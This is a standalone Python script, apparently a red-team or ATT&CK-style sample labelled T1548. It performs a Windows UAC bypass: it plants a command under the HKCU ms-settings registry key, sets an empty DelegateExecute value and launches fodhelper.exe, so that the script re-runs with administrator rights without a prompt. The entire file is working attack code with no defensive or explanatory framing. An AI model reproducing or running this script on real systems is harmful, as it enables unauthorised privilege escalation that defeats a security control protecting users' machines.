## Author: lehag
## Code: T1548-BypassUAC.py
import os
import sys
import ctypes
import winreg  ## pip3 install winregistry

CMD = "C:\\Windows\\System32\\cmd.exe";
FOD_HELPER = "C:\\Windows\\System32\\fodhelper.exe";
PYTHON_CMD = "python";
REG_PATH = "Software\\Classes\\ms-settings\\shell\\open\\command";
DELEGATE_EXEC_REG_KEY = "DelegateExecute";

def is_running_as_admin():
	"""
		Checks if the script is running with admin privileges.
	"""
	try:
		return ctypes.windll.shell32.IsUserAnAdmin();
	except:
		return False;

def create_reg_key(key, value):
	"""
		Creates a registry key.
	"""
	try:
		winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH);
		registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE);
		winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value);
		winreg.CloseKey(registry_key);
	except WindowsError:
		raise;

def bypass_uac():
	"""
		Performs UAC bypass.
	"""
	current_dir = os.path.dirname(os.path.realpath(__file__)) + "\\" + __file__;
	cmd = "{} /k {} {}".format(CMD, PYTHON_CMD, current_dir);
	try:
		create_reg_key(DELEGATE_EXEC_REG_KEY, "");
		create_reg_key(None, cmd);
		os.system(FOD_HELPER);
		sys.exit(0);
	except WindowsError:
		raise;

if __name__ == "__main__":
	if(is_running_as_admin()):
		print("[+] Admin privileges detected.");
	else:
		print("[!] No admin privileges detected.");
		print("[+] Bypassing the UAC control");
		bypass_uac();
